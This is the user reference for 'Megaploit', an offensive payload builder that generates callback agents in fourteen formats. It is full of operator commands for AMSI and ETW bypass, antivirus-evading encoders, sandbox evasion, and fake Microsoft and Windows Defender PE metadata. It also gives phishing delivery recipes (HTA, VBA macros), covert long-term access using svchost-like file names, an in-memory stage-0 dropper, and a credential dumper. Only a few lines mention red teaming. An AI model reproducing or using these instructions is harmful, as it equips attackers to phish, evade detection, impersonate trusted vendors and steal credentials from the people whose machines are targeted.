# Megaploit Payload Builder

Complete reference for all 14 payload formats, 12 encoders, and build options.

---

## Overview

The payload builder generates agent payloads in formats suitable for any delivery method.
All formats bake in the LHOST, PORT, and optional TLS settings.

```
megaploit [0] » payload <format> [options]
```

**Quick start:**

```
megaploit [0] » set lhost 192.168.1.10
megaploit [0] » set port 4444
megaploit [0] » payload ps1 --out agent.ps1
```

---

## All 14 Formats

### `py` — Pure Python Source

The default format. Runs on any machine with Python 3.6+ installed.
No compilation required. Easily modifiable.

```
megaploit [0] » payload py --out agent.py
megaploit [0] » payload py                  # print to terminal
```

**Deploy on target:**

```bash
python3 agent.py
```

---

### `ps1` — PowerShell Dropper

Runs as a PowerShell script. Has AMSI bypass, ETW patch, and sandbox check baked in.
No Python required on the target.

```
megaploit [0] » payload ps1 --out agent.ps1
megaploit [0] » payload ps1 --sleep 30 --out agent.ps1
```

**Deploy on target:**

```powershell
# Run from PowerShell (as admin if needed):
powershell -ep bypass -file agent.ps1

# Or one-liner:
powershell -ep bypass -c "IEX (Get-Content agent.ps1 | Out-String)"
```

---

### `hta` — HTML Application Dropper

Runs as a `.hta` file via `mshta.exe`. Includes VBScript sandbox checks.
Useful for phishing emails or web-based delivery.

```
megaploit [0] » payload hta --out agent.hta
```

**Deploy on target:**

```
mshta agent.hta
# Or: double-click in Windows Explorer
# Or: email as attachment (macro-enabled)
```

---

### `vba` — VBA Macro Dropper

Office macro for Word/Excel. Includes sandbox checks and Application.Wait delays.

```
megaploit [0] » payload vba --out macro.vba
```

**Deploy:** Paste the macro code into an Office document's VBA editor (Alt+F11), then run.

---

### `sh` — Bash/sh Dropper

Shell script for Linux/macOS/Unix. Includes nproc/df/uptime sandbox checks.

```
megaploit [0] » payload sh --out agent.sh
```

**Deploy on target:**

```bash
chmod +x agent.sh && ./agent.sh
bash agent.sh
```

---

### `bat` — Windows Batch Dropper

Windows `.bat` file with inline AMSI + ETW bypass via PowerShell.

```
megaploit [0] » payload bat --out agent.bat
```

**Deploy on target:**

```
agent.bat
# Or: cmd /c agent.bat
```

---

### `exe` — Windows EXE (PyInstaller)

Standalone Windows executable. No Python required on target.
Requires `pyinstaller` on the operator machine.

```
megaploit [0] » payload exe --out agent.exe

# With UPX packing (smaller size):
megaploit [0] » payload exe --out agent.exe --upx

# With fake PE metadata to blend in with legitimate software:
megaploit [0] » payload exe --out agent.exe \
    --pe-company "Microsoft Corporation" \
    --pe-product "Windows Defender" \
    --pe-version "4.18.2304.8" \
    --pe-copyright "(C) Microsoft Corporation. All rights reserved."
```

**Install PyInstaller first:**

```bash
pip install pyinstaller
```

---

### `elf` — Linux ELF (PyInstaller)

Standalone Linux binary. No Python required on target.
Requires `pyinstaller` on the operator machine.

```
megaploit [0] » payload elf --out agent
megaploit [0] » payload elf --out agent --upx
```

**Deploy on target:**

```bash
chmod +x agent && ./agent
```

---

### `go_exe` — Go Agent for Windows

Compiles the Go agent source into a Windows EXE.
Go binary: no Python, no dependencies, very small footprint.
Requires the `go` toolchain on the operator machine.

```
megaploit [0] » payload go_exe --out agent.exe
```

**Features of the Go agent:**
- AES-256-GCM encrypted transport
- HMAC-SHA256 authentication
- Optional TLS support
- Auto-reconnect with exponential jitter

**Install Go:**

```bash
# Linux:
sudo apt install golang-go
# macOS:
brew install go
# Windows: https://go.dev/dl/
```

---

### `go_elf` — Go Agent for Linux/macOS

Compiles the Go agent for Linux or macOS.

```
megaploit [0] » payload go_elf --out agent_linux
megaploit [0] » payload go_elf --out agent_mac
```

---

### `oneliner_py` — Python One-Liner

Single compressed Python command you can paste directly into a terminal.
No files needed — everything is inline.

```
megaploit [0] » payload oneliner_py
python3 -c "exec(__import__('base64').b64decode(__import__('zlib').decompress(b'...')))"
```

**Deploy:** Copy the printed command, paste into a terminal on the target.

---

### `oneliner_ps1` — PowerShell One-Liner

Single PowerShell command with inline AMSI bypass and ETW patch.

```
megaploit [0] » payload oneliner_ps1
powershell -ep bypass -c "..."
```

**Deploy:** Copy and paste into a PowerShell prompt on the target.

---

### `py_stealth` — Stealth Python Agent

Python agent that uses only `ctypes` — no top-level `subprocess` or `socket` imports.
Much lower AV signature than the standard agent.

```
megaploit [0] » payload py_stealth --out stealth_agent.py
```

---

### `raw` — Raw Output (same as `py`)

Identical to `py`. Useful for piping into other tools:

```bash
megaploit [0] » payload raw | python3 -c "import sys; exec(sys.stdin.read())"
```

---

## All Options

| Option | Applies to | Example | Description |
|---|---|---|---|
| `--out <file>` | All | `--out agent.ps1` | Write to file instead of printing to terminal |
| `--tls` | All | `--tls` | Agent uses TLS (server cert auto-generated if needed) |
| `--encoder <name>` | py, ps1, sh, bat | `--encoder comment_spam` | Apply encoder (can repeat for multiple) |
| `--upx` | exe, elf | `--upx` | UPX-compress the binary (requires `upx` on PATH) |
| `--sleep <secs>` | All | `--sleep 30` | Sleep N seconds before connecting (sandbox evasion) |
| `--pe-company <n>` | exe, elf | `--pe-company "Microsoft"` | Fake company name in PE metadata |
| `--pe-product <n>` | exe, elf | `--pe-product "Windows Defender"` | Fake product name |
| `--pe-version <v>` | exe, elf | `--pe-version "4.18.2304.8"` | Fake version string |
| `--pe-copyright <s>` | exe, elf | `--pe-copyright "(C) Microsoft"` | Fake copyright |

---

## Encoders

Encoders obfuscate the payload to evade signature-based detection. Encoders can be chained — they apply in order.

```
megaploit [0] » payload py --encoder xor_rolling --encoder b64gzip --out encoded.py
```

### Available Encoders

| Name | What it does | Best for |
|---|---|---|
| `xor_rolling` | XOR with rolling 32-byte key (key prepended to output) | Basic AV bypass |
| `rc4` | RC4 stream cipher with 16-byte key prepended | Moderate AV bypass |
| `b64gzip` | Gzip compress → base64 encode | Shrinks size, mild obfuscation |
| `rev` | Reverse the byte sequence | Trivial reverse |
| `zlib_b64` | Zlib compress → base64 encode | Similar to b64gzip |
| `rot13_src` | ROT-13 printable ASCII characters | Weak, for demo only |
| `null_pad` | Insert a null byte after every real byte | Breaks naive string matching |
| `comment_spam` | Insert random inline comments (~40% of lines) | Python code obfuscation |
| `varname_rand` | Randomise short Python variable names | Code structure obfuscation |
| `ps1_concat` | PowerShell string concatenation obfuscation | `ps1` format only |
| `sandbox_detect` | Prepend sandbox guard (CPU, disk, uptime, hostname, debugger, mouse check) | AV sandbox evasion |
| `etw_patch` | Prepend ETW patcher (VirtualProtect → 0xC3 RET stub) | ETW telemetry bypass |

### Encoding Examples

```
# Simple obfuscation for Python agent
megaploit [0] » payload py --encoder comment_spam --encoder varname_rand --out obf.py

# Hardened agent with sandbox detection and ETW bypass
megaploit [0] » payload py --encoder sandbox_detect --encoder etw_patch --out hardened.py

# Compressed one-liner
megaploit [0] » payload py --encoder b64gzip --out compressed.py

# PowerShell with string concat obfuscation
megaploit [0] » payload ps1 --encoder ps1_concat --out obf.ps1

# Multiple layers (apply in order listed)
megaploit [0] » payload py \
    --encoder sandbox_detect \
    --encoder etw_patch \
    --encoder comment_spam \
    --encoder b64gzip \
    --out ultra_hardened.py
```

---

## Complete Examples

### Standard Red Team Payload Set

```
# 1. Set callback details
megaploit [0] » set lhost 192.168.1.10
megaploit [0] » set port 4444

# 2. Enable TLS
megaploit [0] » tls auto

# 3. Build a stealth Windows EXE
megaploit [0] » payload exe --tls --out agent.exe \
    --pe-company "Microsoft Corporation" \
    --pe-product "Windows Security" \
    --pe-version "10.0.22621.1" \
    --upx

# 4. Build a PowerShell one-liner with sandbox check + sleep
megaploit [0] » payload oneliner_ps1 --sleep 60

# 5. Build a VBA macro for phishing
megaploit [0] » payload vba --out macro.vba

# 6. Build a Linux agent
megaploit [0] » payload go_elf --out agent_linux
```

### Phishing Campaign

```
# HTA for web delivery
megaploit [0] » payload hta --sleep 10 --out update.hta

# PowerShell for macro execution
megaploit [0] » payload ps1 --encoder sandbox_detect --out install_update.ps1

# One-liner for direct terminal execution
megaploit [0] » payload oneliner_ps1
```

### Covert Long-Term Access

```
# Go binary — small, standalone, no Python
megaploit [0] » payload go_exe --tls --out svchost_helper.exe

# Python stealth agent with sleep for sandbox evasion
megaploit [0] » payload py_stealth --sleep 30 --encoder etw_patch --out helper.py
```

---

## Staged Delivery

Instead of delivering the full agent, deliver a small stage-0 dropper that fetches the real agent over HTTPS:

```
# Generate the stage-0 dropper
megaploit [0] » stage0 generate --start --out dropper.py
[+] Staging server started on port 4445
[+] Stage-0 dropper written: dropper.py

# Deliver dropper.py to target (much smaller than full agent)
# Target runs dropper.py → it downloads and executes the real agent in memory
```

Advantages:
- Stage-0 is tiny (< 1 KB) — fewer bytes to deliver
- Full agent never written to disk on target
- HMAC-SHA256 authenticated download

---

## Building C / Native Payloads

### C-remote-shell Windows EXE

```
megaploit [0] » crs_build
# Compiles C-remote-shell/megaploit_c_agent.exe
# Requires: apt install mingw-w64 (Linux/macOS)
#           MSVC Developer Command Prompt (Windows)

megaploit [0] » crs_payload_info
# Shows the exact MinGW compile command
```

### Kiwi (Windows credential dumper)

Kiwi compiles automatically on first use inside a Windows session:

```
megaploit session(1) » kiwi logonpasswords
# Compiles megaploit_kiwi.exe if not already compiled, uploads, runs, returns output
```
